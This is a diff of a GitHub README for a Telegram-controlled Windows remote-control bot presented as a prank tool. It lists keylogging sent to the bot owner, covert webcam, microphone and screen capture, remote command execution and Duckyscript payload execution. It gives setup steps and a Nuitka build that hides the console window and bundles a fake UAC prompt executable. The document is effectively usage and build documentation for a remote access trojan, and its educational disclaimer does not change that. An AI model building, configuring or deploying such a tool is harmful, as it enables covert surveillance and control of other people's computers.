@@ -1,68 +1,93 @@
 # RCPepTelegram
-Remote Control Bot, inspired to the previous creation named "Peppino", this one offers many features, including some pretty original pranks.
-(only tested on Windows10/11)
 
-See [Commands](docs/COMMANDS.md)
-```/help: 
-📎 File Input Commands
-*sending a photo* - Displays the photo on the screen as a pop-up.
-*sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.
-*sending a video with /setvideowallpaper as caption will play it as wallpaper(dont use long videos).
-*sending an audio/voice* - Will play the audio/voice in the background.
-*sending a file that ends with '.dd' - will execute it as duckyscript. (send /duckyhelp to get commands)
-*sending a file with /save and the path will save that file in that path, no matter the extension. (example *photo* /save C:\Users\YOURUSER\Photo\*
-📚 Multi-Command
-You can run multiple commands at the same time by sending them in the same message but separated by a comma.
-For example this command: "/fullclip 10; /jumpscare" will start the recording, waits 5 seconds, then sends a
-jumpscare while recording screen and webcam
+**RCPepTelegram** is a Telegram-controlled remote control bot for Windows, inspired by a previous project named *Peppino*.  
+It provides a wide set of remote interaction features, including system control, media capture, automation, and prank-oriented actions.
+
+**Tested on:** Windows 10 / Windows 11 only.
+
+---
+
+## 📌 Overview
+
+RCPepTelegram runs locally on a Windows machine and exposes its functionality through a Telegram bot.
+Commands, media uploads, and plugins allow real-time interaction with the target system.
+
+The project is intended for educational, experimental, and controlled environments.
+
+---
+
+## 📚 Documentation
+
+- 📄 **Commands:** `docs/COMMANDS.md`
+- 🧩 **Plugins:** `docs/PLUGINS.md`
+
+---
+
+## ✨ Features
+
+- Screen recording (fixed duration)
+- Webcam recording
+- Live screen and webcam streaming (via tunnel providers)
+- Screenshot capture
+- Microphone audio recording
+- Keylogging with Telegram delivery
+- Remote command execution
+- Duckyscript payload execution
+- Custom message boxes
+- System control (shutdown, simulated actions, etc.)
+- Media-based pranks (popups, jumpscares, wallpaper video)
+
+---
+
+## ⌨️ Command System
+
+### File & Media Input Commands
+
+- **Send a photo**  
+  Displays the photo as a pop-up on the screen.
+
+- **Send a photo with `/jumpscare` caption**  
+  Displays the image as a jumpscare.
+
+- **Send a video with `/setvideowallpaper` caption**  
+  Plays the video as a desktop wallpaper (avoid long videos).
+
+- **Send an audio or voice message**  
+  Plays the audio in the background.
+
+- **Send a `.dd` file**  
+  Executes the file as Duckyscript  
+  (`/duckyhelp` for available commands).
+
+- **Send a file with `/save <path>` caption**  
+  Saves the file to the specified path, regardless of extension.  
+  Example:  
+  `photo.jpg /save C:\Users\YOURUSER\Pictures`
+
+---
+
+### 📚 Multi-Command Execution
+
+Multiple commands can be executed in sequence by separating them with a comma.
+
+**Example:**
 ```
-## Features
-- Screen Recording: Record the screen for a specified duration.
-- Webcam Recording: Record video from the webcam.
-- Keylogging: Log keystrokes and send them to the bot owner.
-- Remote Commands: Execute system commands remotely.
-- Duckyscript Execution: Execute Duckyscript payloads.
-- Audio Recording: Record audio from the microphone.
-- Screenshot Capture: Take screenshots of the system.
-- Message Boxes: Display custom message boxes on the system.
-- System Control: Simulate system shutdowns or other actions.
-- Live Webcam and Screen: Use ngrok tunnels to have a live view of the machine.
-## Installation
-1. Clone the repository
-
-```bash
-git clone https://github.com/RiccardoZappitelli/RCPepTelegram
-
+/fullclip 10; /jumpscare
 ```
-2. Install the dependences
 
-```bash
-pip install -r requirements.txt
+This command:
+1. Starts a full recording
+2. Waits 5 seconds
+3. Triggers a jumpscare while recording screen and webcam
 
-```
-## Configuration
-Create your own bot with <a href="https://core.telegram.org/bots#botfather">Botfather</a>
-Obtain your CHAT ID and BOT TOKEN.
-auth.json
+---
 
-```json
-{
-    "token":"<YOUR TOKEN>",
-    "chatid":"<YOUR CHAT ID>",
-    "ngrok_token":"<YOUR NGROK TOKEN>",
-    "tunnel_provider":"<TUNNEL PROVIDER>"// can be either "localtunnel" or "ngrok"
-}
-
-```
-## BUILD
-Get the latest version of [FakeUAC](https://github.com/RiccardoZappitelli/FakeUAC) and put the executable in assets/executable/fakeuac.exe.
-I could not add it because github has a 100MB limit and the executable was 114MB.
-```bash
-nuitka pep2.py --standalone --windows-console-mode=disable --onefile --follow-imports --msvc=latest --include-data-dir=assets/vfx=assets/vfx --include-data-dir=assets/sfx=assets/sfx --include-data-dir=assets/model=assets/model --include-data-file=auth.json=auth.json --include-data-file=assets/executables/fakeuac.exe=assets/executables/fakeuac.exe
-```
 ## 🧩 Plugin System
+
 RCPepTelegram supports **class-based plugins** that integrate directly with the bot, UI, and messaging system.
-Make sure to check [Plugins](docs/PLUGINS.md)
+
+Refer to: `docs/PLUGINS.md`
+
 ### 📁 Plugin Structure
 
 ```
@@ -71,23 +96,29 @@ plugins/
 ├── system_plugins.py
 └── custom_plugins.py
 ```
+
 ### 🧪 Minimal Plugin Example
 
 ```python
 from .plugin_base import Plugin
 import os
+
 class ShutdownTimed(Plugin):
     def __init__(self):
         super().__init__("⏻ Schedule Shutdown", "shutdown_timed")
+
     def action(self, seconds: int = 60):
         os.system(f"shutdown -s -t {seconds}")
         self.pep2.bsend(f"Shutdown scheduled in {seconds} seconds.")
 ```
+
 ### 🧠 Plugin Rules
-- Inherit from `Plugin`
-- `__init__(label, command)` sets button name and Telegram command
-- `action(...)` is triggered on command/button click
-- `self.pep2` is the reference to the running `PeppinoTelegram` instance
+
+- Must inherit from `Plugin`
+- `__init__(label, command)` defines button label and Telegram command
+- `action(...)` is triggered on command or button click
+- `self.pep2` references the active `PeppinoTelegram` instance
+
 ### 📌 Plugin Registration
 
 ```python
@@ -97,22 +128,104 @@ plugins = [
     LockWorkstation
 ]
 ```
-## ⚠️ WARNING: Security and Ethical Risks ⚠️
-This code is intended for educational purposes only and should not be used in any malicious, unethical, or unauthorized manner. The script contains functionalities that can potentially compromise the security and privacy of a system, including but not limited to:
-- Remote Control: The code allows for remote control of a system, including executing commands, capturing screenshots, recording audio/video, and more.
-- Keylogging: The script includes keylogging capabilities, which can record keystrokes and send them to a remote user.
-- Webcam Access: The script can access and record from the webcam without the user's explicit consent.
-- System Manipulation: The script can simulate system shutdowns, open message boxes, and perform other actions that could disrupt normal system operations.
-- Duckyscript Execution: The script can execute Duckyscript payloads, which are often used in penetration testing but can also be used maliciously.
-## Ethical Considerations
-Unauthorized Access: Using this script to access or control a system without the owner's explicit permission is illegal and unethical.
-## Privacy Violation: Capturing audio, video, or screenshots without consent is a serious violation of privacy.
-Potential for Abuse: This script can be easily modified for malicious purposes, such as spying, data theft, or system disruption.
-## Security Risks
-- Exposure of Sensitive Data: If the script is not properly secured, sensitive information such as Telegram API tokens, chat IDs, and recorded data could be exposed.
-- Remote Exploitation: If the script is deployed in an insecure environment, it could be exploited by attackers to gain unauthorized access to the system.
-## Recommendations
-- Use Responsibly: Only use this script in environments where you have explicit permission to do so, such as your own systems or systems you are authorized to test.
-- Secure Your Environment: Ensure that any API tokens, chat IDs, or other sensitive information are kept secure and not exposed to unauthorized users.
-- Legal Compliance: Be aware of and comply with all applicable laws and regulations regarding system access, privacy, and data protection.
-- By using this code, you acknowledge and accept full responsibility for any actions taken with it. The author of this code is not responsible for any misuse, damage, or legal consequences that may arise from its use.
+
+---
+
+## 🛠 Installation
+
+### 1. Clone the repository
+
+```bash
+git clone https://github.com/RiccardoZappitelli/RCPepTelegram
+cd RCPepTelegram
+```
+
+### 2. Install dependencies
+
+```bash
+pip install -r requirements.txt
+```
+
+---
+
+## ⚙️ Configuration
+
+Create a Telegram bot using [BotFather](https://core.telegram.org/bots#botfather) and obtain:
+
+- **Bot Token**
+- **Chat ID**
+
+Create an `auth.json` file in the project root:
+
+```json
+{
+    "token": "<YOUR BOT TOKEN>",
+    "chatid": "<YOUR CHAT ID>",
+    "ngrok_token": "<YOUR NGROK TOKEN>",
+    "tunnel_provider": "ngrok"
+}
+```
+
+`tunnel_provider` can be either `"ngrok"` or `"localtunnel"`.
+
+---
+
+## 🏗 Build (Nuitka)
+
+1. Download the latest release of **FakeUAC**  
+   https://github.com/RiccardoZappitelli/FakeUAC
+
+2. Place the executable here:
+```
+assets/executables/fakeuac.exe
+```
+
+> The executable is not included because it exceeds GitHub's 100MB file size limit.
+
+3. Build with Nuitka:
+
+```bash
+nuitka pep2.py   --standalone   --onefile   --windows-console-mode=disable   --follow-imports   --msvc=latest   --include-data-dir=assets/vfx=assets/vfx   --include-data-dir=assets/sfx=assets/sfx   --include-data-dir=assets/model=assets/model   --include-data-file=auth.json=auth.json   --include-data-file=assets/executables/fakeuac.exe=assets/executables/fakeuac.exe
+```
+
+---
+
+## ⚠️ Security & Ethical Warning
+
+This project contains functionality that can significantly impact system security and user privacy.
+
+Included capabilities such as:
+- Remote system control
+- Keylogging
+- Webcam and microphone access
+- Screenshot and screen recording
+- Duckyscript execution
+
+**must only be used on systems you own or are explicitly authorized to test.**
+
+---
+
+## ⚖️ Ethical Considerations
+
+- Unauthorized access is illegal and unethical
+- Recording audio, video, or keystrokes without consent is a serious privacy violation
+- The project can be abused if deployed irresponsibly
+
+---
+
+## 🔐 Security Risks
+
+- Exposure of sensitive data (Telegram tokens, chat IDs, recordings)
+- Potential remote exploitation if deployed insecurely
+
+---
+
+## ✅ Recommendations
+
+- Use only in controlled environments
+- Secure all credentials and generated data
+- Comply with applicable laws and regulations
+
+By using this code, you accept full responsibility for its usage.  
+The author is not responsible for misuse, damage, or legal consequences.
+
